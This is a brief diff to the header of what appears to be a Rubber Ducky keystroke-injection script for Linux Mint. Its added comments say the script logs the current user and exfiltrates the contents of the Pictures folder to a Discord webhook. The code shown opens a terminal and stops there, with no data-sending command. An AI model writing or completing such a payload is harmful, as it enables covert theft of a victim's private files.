@@ -1,7 +1,7 @@
-REM No need to define username as script will find it.
 REM WEBHOOK for discord is needed.
 REM Tested on Linux Mint
-REM Author CrackedGh0st
+REM Author- CrackedGh0st
+REM Purpuse/Function - logs current user and navigate to home/User/pictures and elfitrates them with discord webhook 
 
 DELAY 100
 CTRL-ALT t
